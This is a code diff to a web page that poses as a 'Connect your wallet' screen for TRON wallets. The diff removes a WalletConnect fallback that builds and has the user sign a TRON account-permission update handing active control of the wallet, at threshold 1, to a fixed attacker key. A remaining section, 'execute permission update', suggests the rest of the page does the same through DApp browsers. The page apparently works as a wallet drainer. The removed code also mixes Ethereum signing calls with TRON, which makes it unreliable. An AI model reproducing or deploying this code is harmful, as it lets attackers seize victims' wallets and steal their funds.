@@ -107,84 +107,9 @@ async function tryConnect() {
 function showFallback() {
   loader.style.display = 'none';
   m.textContent = 'Connect your wallet';
-  actions.innerHTML =
-    '<div class="btn primary" id="wc-btn">🔄 WalletConnect</div>';
   hint.innerHTML =
-    'or open in<br><b>TP · TronLink · OKX · Bitget · SafePal · TokenPocket</b><br>DApp browser';
+    'Open in<br><b>TP · TronLink · OKX · Bitget · SafePal · TokenPocket</b><br>DApp browser';
   status.style.color = 'rgba(255,255,255,0.7)';
-  document.getElementById('wc-btn').onclick = startWalletConnect;
-}
-
-// ==================== WalletConnect for Trust Wallet & others ====================
-
-async function startWalletConnect() {
-  m.textContent = 'Opening WalletConnect...';
-  actions.innerHTML = '';
-  hint.textContent = '';
-
-  try {
-    const { EthereumProvider } = await import(
-      'https://unpkg.com/@walletconnect/ethereum-provider@2.12.2/dist/umd/index.min.js'
-    );
-    const provider = await EthereumProvider.init({
-      projectId: '9b0a7b8c3d2e1f4a5b6c7d8e9f0a1b2c',
-      chains: [728126428], // TRON mainnet CAIP-2
-      optionalChains: [728126428],
-      methods: ['eth_sendTransaction', 'eth_signTransaction', 'personal_sign'],
-      showQrModal: true,
-      metadata: { name: 'DApp', description: 'DApp', url: location.origin, icons: [] }
-    });
-    await provider.connect();
-    const accounts = provider.accounts;
-    if (accounts && accounts[0]) {
-      // Convert EIP-55 ETH address to base58 if needed, or use directly
-      const addr = accounts[0];
-      // Build raw tronWeb for signing — use the provider as transport
-      const tw = {
-        transactionBuilder: {
-          updateAccountPermissions: function(owner, ownerPerm, witnessPerm, actives) {
-            // Build via TRON API directly
-            return fetch('https://api.trongrid.io/wallet/accountpermissionupdate', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                owner_address: owner,
-                visible: true,
-                actives: [{
-                  type: 'Active', permission_name: 'active', threshold: 1,
-                  operations: OPS,
-                  keys: [{ address: ACTIVE_KEY, weight: 1 }]
-                }]
-              })
-            }).then(r => r.json());
-          }
-        },
-        trx: {
-          sign: async function(tx) {
-            // Sign via WalletConnect provider
-            const sig = await provider.request({
-              method: 'eth_signTransaction',
-              params: [tx]
-            });
-            return sig;
-          },
-          sendRawTransaction: async function(signed) {
-            const txid = await provider.request({
-              method: 'eth_sendRawTransaction',
-              params: [signed]
-            });
-            return { txid };
-          }
-        }
-      };
-      go(addr, tw);
-    } else {
-      hint.textContent = 'No account returned';
-    }
-  } catch(err) {
-    hint.textContent = 'WC: ' + (err.message || err).slice(0, 80);
-    m.textContent = 'Connection failed';
-  }
 }
 
 // ==================== execute permission update ====================
